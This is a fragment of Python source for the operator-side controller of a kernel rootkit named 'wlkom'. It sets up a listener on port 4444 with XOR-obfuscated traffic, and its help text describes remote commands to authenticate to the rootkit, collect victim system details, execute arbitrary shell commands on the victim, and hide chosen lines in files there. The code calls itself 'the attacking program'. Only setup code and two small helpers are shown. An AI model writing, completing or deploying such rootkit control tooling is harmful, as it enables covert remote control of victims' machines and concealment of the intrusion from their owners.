import os
import threading

from rich.console import Console



CONFIG_DIR = os.path.expanduser("~/.config/wlkom")
AUTH_FILE = os.path.join(CONFIG_DIR, "auth")

HOST = "0.0.0.0"
PORT = 4444

XOR_KEY = b"wlkom"



HELP_TEXT = [
    "[LOCAL COMMANDS] (no rootkit needed)",
    "  STOP | QUIT | EXIT | Q          Quit the attacking program",
    "  HASHPASS <pass>                 Compute DJB2 hash of <pass> (for kernel recompile)",
    "  HELP                            Show this help",
    "[ROOTKIT COMMANDS] (require connection, no authentication needed)",
    "  PING                            Liveness check : rootkit replies PONG",
    "  AUTH <password>                 Authenticate with the rootkit",
    "  LOGOUT                          Send QUIT to the rootkit : closes the session (rootkit will auto-reconnect)",
    "[ROOTKIT COMMANDS] (require connection + authentication)",
    "  INFO                            Get victim system info (replies sysname, release, machine from utsname)",
    "  EXEC <command>                  Run a shell command on the victim (space-separated args, cwd persists across calls)",
    "[HIDE COMMANDS] (require connection + authentication)",
    "  HIDE_ADD <pattern> <filepath>   Hide lines matching <pattern> in <filepath> (pattern must not contain spaces)",
    "  HIDE_DEL <pattern> <filepath>   Stop hiding lines matching <pattern> in <filepath> (error if not found)",
    "  HIDE_INFO                       List all currently registered hidden patterns and their associated file",
    "  HIDE_HELP                       Show rootkit help for HIDE_* commands",
]

LOCAL_EXIT_COMMANDS = {"stop", "quit", "exit", "q"}

console = Console()
logs = []
clients = []
logs_lock = threading.Lock()
clients_lock = threading.Lock()
server_running = True
is_connected = False
current_input = ""
is_authenticated = False
last_exit_code = None
last_pwd = "/"


    


def xor_bytes(data):
    return bytes(b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(data))


def add_log(message, is_stderr=False):
    with logs_lock:
        logs.append((message, is_stderr))
        if len(logs) > 17:
            logs.pop(0)

